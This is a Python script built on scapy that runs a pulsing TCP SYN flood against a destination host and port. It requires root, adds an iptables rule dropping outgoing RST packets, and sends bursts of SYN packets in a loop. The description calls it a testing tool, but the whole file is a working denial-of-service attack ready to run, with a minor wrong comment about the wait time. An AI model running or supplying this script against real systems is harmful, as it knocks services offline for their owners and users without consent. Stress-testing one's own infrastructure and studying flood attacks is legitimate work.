import logging
import socket
logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%I:%M:%S', level=logging.INFO)
logger = logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import os, sys, argparse, time

PULSE_DURATION = 5
WAIT_TIME = 10
PERIOD = PULSE_DURATION + WAIT_TIME

def performAttack(destination, port):
    a = IP(dst=destination) / TCP(flags="S", sport=RandShort(), dport=int(port))
    send(a, verbose=False)  # Sends the Packet

if __name__ == "__main__":
    if os.getuid() != 0:  # Checks to see if the user running the script is root.
        print("You need to run this program as root for it to function correctly.")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description='Testing tool to send SYN requests to the target with a specific frequency.')
    parser.add_argument('-s', action="store", dest='source', help='The source IP address.')
    parser.add_argument('-d', action="store", dest='destination', help='The destination url for the SYN packet.')
    parser.add_argument('-n', action="store", dest='number', help='The amount of SYN packets to send.')

    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = vars(args)

    print("\n###########################################")
    print("#\t Starting Pulsing SYN Flood\t  #")
    print("###########################################\n")

    iterationCount = 0
    command = 'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s ' + args['source'] + ' -j DROP'
    ip_dest = socket.gethostbyname(args['destination'])

    try:
        os.system(command)
        # Non privileged
        port = random.randint(1024, 65535)
        while True:
            if args['number'] is not None:
                perPulsing = int(args['number'])
                while perPulsing > 0:
                    performAttack(ip_dest, port)
                    perPulsing -= 1
                    iterationCount = iterationCount + 1
                    logging.info('\t Total packets sent:\t %i', iterationCount)
            else:
                t_end = time.time() + PULSE_DURATION  # perform attack for 5 seconds
                while time.time() < t_end:
                    performAttack(ip_dest, port)
                    iterationCount = iterationCount + 1
                    logging.info('\t Total packets sent:\t %i',iterationCount)
            time.sleep(WAIT_TIME)  # wait 30 seconds
    except KeyboardInterrupt:
        print('\nSYN Flood stopped!')
        sys.exit()